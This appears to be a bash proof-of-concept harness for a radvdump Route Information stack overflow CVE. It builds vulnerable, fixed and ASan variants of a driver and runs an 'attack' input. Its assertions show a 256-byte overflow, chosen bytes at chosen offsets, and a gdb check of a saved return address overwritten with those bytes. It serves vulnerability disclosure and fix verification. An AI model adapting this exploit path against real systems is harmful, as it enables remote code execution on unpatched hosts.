#!/bin/bash
# CVE-2026-48715 / GHSA-52px-gh9p-m379 — radvdump Route Information option.
# Every run re-extracts the verbatim case body from four byte-exact pinned
# radvdump.c blobs (parent, fix, affected release, fixed release), checks both
# SHA-256 manifests, builds plain and ASan variants, and drives rungs 1-4.
# No daemon, no listener, no network, no off-loopback access.
set -u
cd "$(dirname "$0")" || exit 99
E=evidence
mkdir -p "$E" vuln fixed rel20 rel21
rm -f "$E"/*.out "$E"/*.log "$E"/normalized.txt \
      vuln/*.inc fixed/*.inc rel20/*.inc rel21/*.inc \
      p-vuln p-fixed p-rel20 p-rel21 a-vuln-gcc a-fixed-gcc a-rel21-gcc a-vuln-clang
PASS=0
FAIL=0

ok() { PASS=$((PASS + 1)); printf 'PASS %s\n' "$1"; }
no() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
has() {
    if grep -qF "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi
}
hasnt() {
    if grep -qF "$2" "$1" 2>/dev/null; then no "$3"; else ok "$3"; fi
}
count() {
    if [ "$(grep -cF "$2" "$1" 2>/dev/null)" = "$3" ]; then ok "$4"; else no "$4"; fi
}

# --- verbatim slices: re-extracted from pinned bytes on every run -----------
V=../src/radvdump.c.878ca6b
F=../src/radvdump.c.068bde13
T=../src/radvdump.c.v2.20
R=../src/radvdump.c.v2.21
{ echo '#line 371 "radvdump.c.878ca6b"'; sed -n '371,399p' "$V"; } > vuln/route_case.inc
{ echo '#line 408 "radvdump.c.068bde13"'; sed -n '408,462p' "$F"; } > fixed/route_case.inc
{ echo '#line 371 "radvdump.c.v2.20"'; sed -n '371,399p' "$T"; } > rel20/route_case.inc
{ echo '#line 408 "radvdump.c.v2.21"'; sed -n '408,462p' "$R"; } > rel21/route_case.inc
(cd ../src && sha256sum -c SHA256SUMS) > "$E/hashcheck.out" 2>&1 \
  && ok "sha256-manifest" || no "sha256-manifest"
count "$E/hashcheck.out" ': OK' 6 'all-6-pinned-files-match'
sha256sum -c SHA256SUMS > "$E/hashcheck-harness.out" 2>&1 \
  && ok "harness-sha256-manifest" || no "harness-sha256-manifest"
count "$E/hashcheck-harness.out" ': OK' 12 'all-12-harness-and-pin-files-match'
count ../src/fix-068bde13.patch '(rinfo->nd_opt_ri_len > 3)' 1 'patch-introduces-one-length-gate'
count vuln/route_case.inc 'if (rinfo->nd_opt_ri_len > 1)' 1 'vuln-gate-only-greater-than-one'
count fixed/route_case.inc '(rinfo->nd_opt_ri_len > 3)' 1 'fixed-gate-rfc4191-max-three'
count rel21/route_case.inc '(rinfo->nd_opt_ri_len > 3)' 1 'release-v2.21-gate-present'
count rel20/route_case.inc '(rinfo->nd_opt_ri_len > 3)' 0 'release-v2.20-gate-absent'
count vuln/route_case.inc 'memcpy(&addr, &rinfo->nd_opt_ri_prefix, (rinfo->nd_opt_ri_len - 1) * 8);' 1 'vuln-unbounded-memcpy-verbatim'

# --- build ------------------------------------------------------------------
cc -O0 -g -fno-stack-protector -std=gnu11 -o p-vuln driver.c 2> "$E/build-p-vuln.log" \
  && ok "build-plain-vuln" || no "build-plain-vuln"
cc -O0 -g -fno-stack-protector -std=gnu11 -DFIXED_VARIANT -o p-fixed driver.c 2> "$E/build-p-fixed.log" \
  && ok "build-plain-fixed" || no "build-plain-fixed"
cc -O0 -g -fno-stack-protector -std=gnu11 -DREL20_VARIANT -o p-rel20 driver.c 2> "$E/build-p-rel20.log" \
  && ok "build-plain-rel20" || no "build-plain-rel20"
cc -O0 -g -fno-stack-protector -std=gnu11 -DREL21_VARIANT -o p-rel21 driver.c 2> "$E/build-p-rel21.log" \
  && ok "build-plain-rel21" || no "build-plain-rel21"
cc -O0 -g -std=gnu11 -fsanitize=address -DNO_OOB_READ -o a-vuln-gcc driver.c \
  2> "$E/build-a-vuln-gcc.log" && ok "build-asan-gcc-vuln" || no "build-asan-gcc-vuln"
cc -O0 -g -std=gnu11 -DFIXED_VARIANT -fsanitize=address -DNO_OOB_READ -o a-fixed-gcc driver.c \
  2> "$E/build-a-fixed-gcc.log" && ok "build-asan-gcc-fixed" || no "build-asan-gcc-fixed"
cc -O0 -g -std=gnu11 -DREL21_VARIANT -fsanitize=address -DNO_OOB_READ -o a-rel21-gcc driver.c \
  2> "$E/build-a-rel21-gcc.log" && ok "build-asan-gcc-rel21" || no "build-asan-gcc-rel21"
if command -v clang >/dev/null 2>&1; then
  clang -O0 -g -std=gnu11 -fsanitize=address -DNO_OOB_READ -o a-vuln-clang driver.c \
    2> "$E/build-a-vuln-clang.log" && ok "build-asan-clang-vuln" || no "build-asan-clang-vuln"
fi

# --- rung 1: advisory arithmetic, no vulnerable function call ---------------
./p-vuln arith > "$E/arith-vuln.out" 2>&1
has "$E/arith-vuln.out" 'RI_LEN=33 RFC_MAX=3 GATE=>1 ACCEPTED=1' 'r1-attacker-length-passes-gate'
has "$E/arith-vuln.out" 'COPY_BYTES=256 DEST_BYTES=16 OVERFLOW_BYTES=240' 'r1-copy-size-vs-destination'

# --- rungs 2+4: vulnerable plain builds, chosen bytes at chosen offsets -----
./p-vuln attack 33 > "$E/plain-vuln-attack.out" 2>&1
has "$E/plain-vuln-attack.out" 'VARIANT=vuln-878ca6b MODE=attack RI_LEN=33 OPTLEN=264 PKT_LEN=280' 'r2-264-byte-option-accepted'
has "$E/plain-vuln-attack.out" 'ENTER_ROUTE_CASE ri_len=33 optlen=264 orig_len=264' 'r2-case-body-reached'
has "$E/plain-vuln-attack.out" 'ADDRTOSTR_CALLS=1' 'r2-memcpy-then-format-reached'
has "$E/plain-vuln-attack.out" 'ADDR_FIRST16=41414141414141414141414141414141' 'r2-attacker-bytes-in-destination'
has "$E/plain-vuln-attack.out" 'FLOG_CALLS=0' 'r2-vuln-no-length-rejection'
has "$E/plain-vuln-attack.out" 'OBS_OFFSET_0=41 OBS_OFFSET_17=5a OBS_OFFSET_24=7a OBS_OFFSET_33=3c OBS_OFFSET_40=7b OBS_OFFSET_63=7e' 'r4-chosen-bytes-at-chosen-offsets'
./p-rel20 attack 33 > "$E/plain-rel20-attack.out" 2>&1
has "$E/plain-rel20-attack.out" 'VARIANT=release-v2.20 MODE=attack RI_LEN=33' 'r2-affected-release-v2.20'
has "$E/plain-rel20-attack.out" 'OBS_OFFSET_17=5a OBS_OFFSET_24=7a OBS_OFFSET_33=3c OBS_OFFSET_40=7b OBS_OFFSET_63=7e' 'r4-affected-release-chosen-bytes'


# --- rung 4 continuation: gdb shows chosen bytes in the saved frame --------
if command -v gdb >/dev/null 2>&1; then
  gdb -q -batch -ex 'break radvdump.c.878ca6b:381' -ex 'run attack 33' \
      -ex 'info frame' -ex 'x/40xb &addr' -ex 'continue' -ex 'bt 2' ./p-vuln \
      > "$E/gdb-frame-raw.txt" 2>&1
  sed -E 's#/home/[^ ]*/harness/#HARNESS/#g; s/0x7fff[0-9a-f]+/0xSTACK/g; s/0x5555[0-9a-f]+/0xCODE/g; s/==[0-9]+==/==PID==/g' \
      "$E/gdb-frame-raw.txt" > "$E/gdb-frame.out"
  has "$E/gdb-frame.out" 'saved rip = 0x414141414141417b' 'r4-gdb-saved-rip-chosen-byte'
  has "$E/gdb-frame.out" 'Stack level 0, frame at' 'r4-gdb-frame-inspected'
  has "$E/gdb-frame.out" '0x5a' 'r4-gdb-stack-chosen-byte-5a'
fi
# --- fixed-commit and fixed-release controls: reject before the write ------
./p-fixed attack 33 > "$E/plain-fixed-attack.out" 2>&1
has "$E/plain-fixed-attack.out" 'FLOG level=3 msg=Invalid Route Information option length 33' 'fixed-rejects-length-33'
has "$E/plain-fixed-attack.out" 'FLOG_CALLS=1 ADDRTOSTR_CALLS=0' 'fixed-no-format-after-reject'
has "$E/plain-fixed-attack.out" 'ADDR_FIRST16=00000000000000000000000000000000' 'fixed-zeroed-destination'
./p-rel21 attack 33 > "$E/plain-rel21-attack.out" 2>&1
has "$E/plain-rel21-attack.out" 'Invalid Route Information option length 33' 'release-v2.21-rejects'
has "$E/plain-rel21-attack.out" 'FLOG_CALLS=1 ADDRTOSTR_CALLS=0' 'release-v2.21-no-write-path'

# --- rung 3: ASan WRITE of 256 past the 16-byte stack object ----------------
./a-vuln-gcc attack 33 > "$E/vuln-gcc-asan.out" 2>&1
has "$E/vuln-gcc-asan.out" 'ERROR: AddressSanitizer: stack-buffer-overflow' 'r3-gcc-asan-overflow'
has "$E/vuln-gcc-asan.out" 'WRITE of size 256' 'r3-gcc-asan-write256'
has "$E/vuln-gcc-asan.out" 'radvdump.c.878ca6b:380' 'r3-gcc-asan-at-pinned-line-380'
has "$E/vuln-gcc-asan.out" 'in route_case' 'r3-gcc-asan-in-route-case'
if [ -x a-vuln-clang ]; then
  ./a-vuln-clang attack 33 > "$E/vuln-clang-asan.out" 2>&1
  has "$E/vuln-clang-asan.out" 'ERROR: AddressSanitizer: stack-buffer-overflow' 'r3-clang-asan-overflow'
  has "$E/vuln-clang-asan.out" 'WRITE of size 256' 'r3-clang-asan-write256'
  has "$E/vuln-clang-asan.out" 'radvdump.c.878ca6b:380' 'r3-clang-asan-at-pinned-line-380'
fi
./a-fixed-gcc attack 33 > "$E/fixed-gcc-asan.out" 2>&1
hasnt "$E/fixed-gcc-asan.out" 'ERROR: AddressSanitizer' 'fixed-asan-clean'
has "$E/fixed-gcc-asan.out" 'Invalid Route Information option length 33' 'fixed-asan-rejects'
./a-rel21-gcc attack 33 > "$E/rel21-gcc-asan.out" 2>&1
hasnt "$E/rel21-gcc-asan.out" 'ERROR: AddressSanitizer' 'release-asan-clean'

# --- safe control: an RFC-conformant option is in bounds in every variant ---
for B in p-vuln p-fixed p-rel20 p-rel21 a-vuln-gcc a-fixed-gcc a-rel21-gcc; do
  ./"$B" safe 2 > "$E/safe-${B}.out" 2>&1
  has "$E/safe-${B}.out" 'ADDRTOSTR_CALLS=1' "safe-${B}-formats-normally"
  hasnt "$E/safe-${B}.out" 'OBS_OFFSET_17=5a' "safe-${B}-no-chosen-byte-past-16"
  hasnt "$E/safe-${B}.out" 'ERROR: AddressSanitizer' "safe-${B}-asan-clean"
done

# --- deterministic normalized trace: no PID, address, path or build id ------
{
  cat "$E"/arith-vuln.out "$E"/plain-vuln-attack.out "$E"/plain-fixed-attack.out \
      "$E"/plain-rel20-attack.out "$E"/plain-rel21-attack.out \
      "$E"/vuln-gcc-asan.out "$E"/vuln-clang-asan.out \
      "$E"/fixed-gcc-asan.out "$E"/rel21-gcc-asan.out 2>/dev/null
} | sed -E 's#/[^ ]*radvdump2shell/harness/#HARNESS/#g; s#/[^ ]*/harness/#HARNESS/#g; s/BuildId: [0-9a-f]+/BuildId: BUILDID/g; s/0x[0-9a-f]+/0xADDR/g; s/#[0-9]+ /#FRAME /g; s/==[0-9]+==/==PID==/g' > "$E/normalized.txt"
TRACE=$(sha256sum "$E/normalized.txt" | cut -d' ' -f1)
printf 'TRACE_SHA256=%s\n' "$TRACE"

printf 'PASS=%d FAIL=%d\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
